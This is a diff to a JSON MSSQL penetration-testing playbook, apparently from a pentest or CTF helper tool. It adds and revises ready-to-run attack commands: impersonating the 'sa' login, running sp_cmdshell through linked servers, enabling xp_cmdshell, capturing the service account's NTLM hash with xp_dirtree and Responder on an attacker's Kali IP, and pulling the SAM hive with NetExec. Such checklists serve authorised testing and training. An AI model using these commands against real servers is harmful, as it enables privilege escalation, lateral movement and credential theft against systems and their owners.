@@ -1,5 +1,5 @@
 {
-  "service": "MSSQL",
+  "service": "ms-sql-s",
   "port": 1433,
   "categories": [
     {
@@ -8,7 +8,7 @@
         {
           "id": "mssql_nmap",
           "title": "Nmap MSSQL Scan",
-          "description": "Basic port and script scan to identify MSSQL instances.",
+          "description": "Basic port and script scan to identify MSSQL instances and domain info.",
           "commands": [
             "nmap -p 1433 -sV -sC {target_ip}",
             "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info -p 1433 {target_ip}"
@@ -26,7 +26,7 @@
       ]
     },
     {
-      "category": "2. Authentication & Execution",
+      "category": "2. Authentication & Lateral Movement",
       "tasks": [
         {
           "id": "mssql_impacket_auth",
@@ -38,9 +38,33 @@
           ]
         },
         {
+          "id": "mssql_impersonation",
+          "title": "Impersonate Logins & Users",
+          "description": "Once authenticated, check if you can impersonate higher-privileged accounts like 'sa'.",
+          "commands": [
+            "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
+            "EXECUTE AS LOGIN = 'sa';",
+            "SELECT SYSTEM_USER;"
+          ]
+        },
+        {
+          "id": "mssql_linked_servers",
+          "title": "Enumerate Linked Servers",
+          "description": "Hunt for trusted database links that allow you to execute commands on remote servers.",
+          "commands": [
+            "EXEC sp_linkedservers;",
+            "EXEC ('sp_cmdshell ''whoami''') AT <Linked_Server_Name>;"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "3. Command Execution & Hash Capture",
+      "tasks": [
+        {
           "id": "mssql_xp_cmdshell",
           "title": "Enable & Run xp_cmdshell",
-          "description": "If you have sysadmin privileges, enable xp_cmdshell to execute system commands.",
+          "description": "If you have sysadmin privileges (or impersonated them), enable xp_cmdshell to execute system commands.",
           "commands": [
             "enable_xp_cmdshell",
             "exec xp_cmdshell 'whoami'",
@@ -50,10 +74,18 @@
         {
           "id": "mssql_xp_dirtree",
           "title": "Hash Capture (xp_dirtree)",
-          "description": "Force the SQL server to authenticate to your Kali machine to capture the service account's NTLM hash via Responder.",
+          "description": "Force the SQL server to authenticate to your Kali machine to capture the service account's NTLM hash.",
           "commands": [
             "sudo responder -I tun0",
             "exec xp_dirtree '\\\\<Kali_IP>\\share'"
+          ]
+        },
+        {
+          "id": "mssql_cme_extract",
+          "title": "Extract Sensitive Files",
+          "description": "Use NetExec/CrackMapExec to reach into the file system and pull down sensitive files (like SAM hives or backups) if you have the rights.",
+          "commands": [
+            "netexec mssql {target_ip} -u <user> -p <password> --get-file \"C:\\windows.old\\windows\\system32\\SAM\" SYSTEM"
           ]
         }
       ]
